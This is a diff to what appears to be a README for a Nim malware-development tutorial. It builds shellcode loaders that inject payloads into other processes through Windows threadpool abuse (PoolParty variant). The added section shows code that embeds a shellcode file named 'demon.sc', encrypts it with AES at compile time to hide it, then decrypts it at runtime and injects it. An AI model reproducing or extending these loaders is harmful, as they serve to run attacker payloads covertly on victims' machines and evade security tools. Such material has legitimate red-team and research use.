@@ -6,7 +6,6 @@ This example is quite large, but of interest there are 3 examples in nimless.
 1. sample_basic_nim_dll.nim -> A simple DLL that pops a message box
 2. nimpool_exe_example.nim  -> A loader that triggers threadpool injection via IoInject->TpDirect; shellcode is read in from the current directory at compile time.
 3. dll_main.nim             -> A DLL that triggers threadpooll injection via IoInject->TpDirect when it is attached to a process.
-4. reflective_loader.nim    -> A reflective loader that will inject our DLL file into a target process.
 ```
 
 ### Creating a Simple DLL
@@ -157,6 +156,7 @@ proc getProcessIdViaNtQueryFunc(szProcessName: pointer, pdwProcessId: var DWORD,
 ```
 
 We include out shellcode by slurping (`staticRead`) at compile time. This could alternatively be done by downloading the payload remotely, as shown in `0x06 - self_injection_loader`. This payload in not obufscated, but obfuscation can easily be implemented.
+
 ```nim
 # Read in shellcode at compile time
 const 
@@ -279,6 +279,44 @@ proc assignChars(smt: NimNode, varName: NimNode, varValue: string, wide: bool) {
 # <snip - same>
 ```
 
+### Using Encryption
+
+This won't be dealt with indepth, but we can use `nimcrypto` at compile-time to read in our payload and encrypt it with AES-CBC256. The payload, key, and iv are held within the executable, so it would be trivial to RE. The encryption is handled in `utils/encryption.nim`
+
+```nim
+# Read in shellcode at compile time and encrypt it
+var (buf, key, iv) = static(encryptAes(slurp("demon.sc")))
+```
+
+Decryption routines are added using `bcrypt.dll` to our `instance.nim`, this will resolve our function pointers when we call `init(ninst)`. We update our main procedure to handle decryption before calling `doPoolPartyVar1`.
+
+```nim
+proc main() {.exportc: "Main".} =
+  discard init(ninst)
+
+  var 
+    pBuf = buf[0].addr
+    szBuf = buf.len
+  PRINTA("[+] Payload at %p of size %i\n", pBuf, szBuf)
+  PRINTA("[+] Key at %p of size %i\n", key[0].addr, key.len)
+  PRINTA("[+] IV  at %p of size %i\n", iv[0].addr, iv.len)
+
+  # Decrypt
+  var 
+    nBuf: PBYTE
+    sznBuf: int
+
+  if installAesDecryption(pBuf, szBuf, key[0].addr, iv[0].addr, nBuf.addr, sznBuf.addr):
+    PRINTA("[+] Successfully decrypted at %p of size %i\n", nBuf, sznBuf)
+
+  var bResult = doPoolPartyVar1(nBuf, sznBuf)
+  
+  PRINTA("[+] doPoolPartyVar1 returned: %i\n", cast[int](bResult))
+
+  ninst.Win32.ExitProcess(69)
+```
+
+When porting over the `installAesDecryption`, `winim` referenced strings that needed to be passed in. These are handled as stack strings
 
 ### Notes
 
